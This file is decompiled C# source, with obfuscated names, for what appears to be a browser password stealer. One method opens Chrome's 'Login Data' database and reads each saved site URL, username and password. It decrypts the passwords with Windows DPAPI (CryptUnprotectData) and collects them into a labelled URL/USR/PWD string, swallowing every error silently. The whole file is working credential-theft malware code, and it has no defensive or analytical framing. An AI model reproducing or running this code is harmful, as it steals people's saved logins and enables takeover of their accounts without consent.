using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace ns5;

internal sealed class Class15
{
	public enum Enum2
	{
		const_0 = 1,
		const_1
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct Struct9
	{
		public int int_0;

		public Enum2 enum2_0;

		public IntPtr intptr_0;

		public string string_0;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct Struct10
	{
		public int int_0;

		public IntPtr intptr_0;
	}

	public static void smethod_0()
	{
		checked
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
				Class5 @class = new Class5(text);
				@class.method_8("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = @class.method_9() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = @class.method_11(i, "origin_url");
					string text3 = @class.method_11(i, "username_value");
					string text4 = smethod_1(Encoding.Default.GetBytes(@class.method_11(i, "password_value")));
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						Class13.string_0 = Class13.string_0 + "|URL| " + text2 + "\r\n|USR| " + text3 + "\r\n|PWD| " + text4 + "\r\n";
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref Struct10 struct10_0, string string_0, ref Struct10 struct10_1, IntPtr intptr_0, ref Struct9 struct9_0, int int_0, ref Struct10 struct10_2);

	public static string smethod_1(byte[] byte_0)
	{
		Struct10 struct10_ = default(Struct10);
		Struct10 struct10_2 = default(Struct10);
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		struct10_.intptr_0 = gCHandle.AddrOfPinnedObject();
		struct10_.int_0 = byte_0.Length;
		gCHandle.Free();
		Struct10 @struct = default(Struct10);
		Struct10 struct10_3 = @struct;
		Struct9 struct2 = default(Struct9);
		Struct9 struct9_ = struct2;
		IntPtr intptr_ = default(IntPtr);
		CryptUnprotectData(ref struct10_, null, ref struct10_3, intptr_, ref struct9_, 0, ref struct10_2);
		checked
		{
			byte[] array = new byte[struct10_2.int_0 + 1];
			Marshal.Copy(struct10_2.intptr_0, array, 0, struct10_2.int_0);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}
}
